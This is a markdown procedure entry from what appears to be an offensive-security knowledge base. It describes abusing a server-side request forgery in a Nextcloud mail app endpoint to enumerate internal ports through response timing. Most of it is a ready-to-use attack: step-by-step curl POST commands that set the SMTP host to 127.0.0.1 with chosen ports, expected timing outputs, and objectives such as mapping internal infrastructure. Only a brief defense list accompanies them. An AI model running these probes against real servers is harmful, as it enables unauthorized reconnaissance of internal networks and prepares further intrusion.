---
id: proc-service-enum-nextcloud-1746582
tags:
  - port-probing
  - service-enum
  - internal-scan
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-post-mail-setup]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
updated_at: '2025-12-14T04:39:09.831Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
---
# Enumerate-Internal-Services-via-Port-Probing

## Summary

This procedure probes multiple common ports using the SSRF to map running internal services based on response timings, revealing infrastructure like databases and web servers.

## Description

By targeting ports associated with known services (e.g., 80 for HTTP, 5432 for PostgreSQL), attackers can infer the tech stack. Observed delays confirm open ports: 80/443 (Apache2), 8080/6060 (CrowdSec), 5432 (PostgreSQL), 6379 (Redis).

## Requirements

1. List of target ports (80, 443, 8080, 6060, 5432, 6379)
2. Timing measurement capability
3. Tolerance for rate limits

## Defense

Defensive measures and detection strategies:

- Firewall internal ports from app server outbound
- Implement connection pooling with timeouts
- Monitor for anomalous internal connection attempts

## Objectives

1. Identify open ports and associated services
2. Map internal network architecture
3. Expose sensitive infrastructure details

## Instructions

### Step 1: Probe Web Ports

**Context**: Test HTTP/HTTPS ports for web services.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"smtpHost":"127.0.0.1","smtpPort":80,"smtpSslMode":"none"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Targets port 80. Expected output: ~5.2s delay indicating Apache2.

### Step 2: Probe Database/Other Ports

**Context**: Scan for backend services.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -w "%{time_total}" -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"smtpHost":"127.0.0.1","smtpPort":5432,"smtpSslMode":"none"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Targets PostgreSQL. Expected output: ~5.191s delay.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Network Service Scanning]] Network Service Scanning

### Sub-Techniques


## Commands Used

- [[commands/curl-post-mail-setup]]

## Tools Used

- [[tools/curl]]

## Tags

- port-probing
- service-enum
- internal-scan
